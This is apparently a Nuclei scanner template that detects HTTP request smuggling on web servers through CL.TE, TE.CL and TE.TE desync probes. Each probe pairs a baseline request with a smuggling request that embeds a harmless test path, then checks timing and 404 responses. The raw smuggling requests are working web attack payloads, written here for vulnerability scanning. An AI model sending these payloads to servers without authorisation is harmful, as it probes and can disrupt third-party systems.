id: http-request-smuggling-detection

info:
  name: HTTP Request Smuggling - CL.TE / TE.CL / TE.TE Detection
  author: achraf-chehboun
  severity: critical
  description: |
    Detects HTTP request smuggling vulnerabilities across CL.TE, TE.CL, and TE.TE
    desync patterns. Uses timing differentials and baseline comparison to confirm
    smuggling — a normal POST must succeed (200/301/302) before testing if the
    smuggling payload causes a desync (404 from the embedded /404test path).
    Non-destructive probe payloads only.
  reference:
    - https://portswigger.net/web-security/request-smuggling
    - https://portswigger.net/research/http-desync-attacks
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N
    cvss-score: 10.0
    cwe-id: CWE-444
  metadata:
    max-request: 10
  tags: smuggling,desync,cl-te,te-cl,te-te,detection-only

http:
  # CL.TE timing differential: smuggling payload should cause back-end timeout
  # Baseline normal POST must be fast, smuggling POST must be slow (>5s)
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 6

        normal
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 6
        Transfer-Encoding: chunked

        0

        X

    unsafe: true
    req-condition: true
    matchers:
      - type: dsl
        name: cl-te-timing-differential
        dsl:
          - 'duration_2 >= 5 && duration_1 < 3 && (duration_2 - duration_1) >= 4'

  # CL.TE response split: baseline must NOT be 404, smuggled must get 404
  # This proves the 404 came from the embedded GET /404test, not the server itself
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 6

        normal
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 30
        Transfer-Encoding: chunked

        0

        GET /404test HTTP/1.1
        X: X

    unsafe: true
    req-condition: true
    matchers:
      - type: dsl
        name: cl-te-response-split
        dsl:
          - 'status_code_1 != 404 && !contains(body_1, "Not Found") && (status_code_2 == 404 || contains(body_2, "Not Found"))'

  # TE.CL: baseline must NOT be 404, smuggled must be 404
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 6

        normal
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 4
        Transfer-Encoding: chunked

        5e
        POST /404-smuggle-test HTTP/1.1
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 15

        x=1
        0


    unsafe: true
    req-condition: true
    matchers:
      - type: dsl
        name: te-cl-desync-detected
        dsl:
          - 'status_code_1 != 404 && status_code_2 == 404'

  # TE.TE: dual Transfer-Encoding with baseline
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 6

        normal
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 4
        Transfer-Encoding: chunked
        Transfer-Encoding: identity

        5e
        POST /404-smuggle-test HTTP/1.1
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 15

        x=1
        0


    unsafe: true
    req-condition: true
    matchers:
      - type: dsl
        name: te-te-obfuscation-v1
        dsl:
          - 'status_code_1 != 404 && status_code_2 == 404'

  # TE.TE: case mismatch variant with baseline
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 6

        normal
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 4
        Transfer-Encoding: chunked
        Transfer-encoding: cow

        5e
        POST /404-smuggle-test HTTP/1.1
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 15

        x=1
        0


    unsafe: true
    req-condition: true
    matchers:
      - type: dsl
        name: te-te-obfuscation-v2
        dsl:
          - 'status_code_1 != 404 && status_code_2 == 404'

    extractors:
      - type: kval
        name: server-info
        kval:
          - Server
          - Via
          - X-Served-By
          - X-Cache
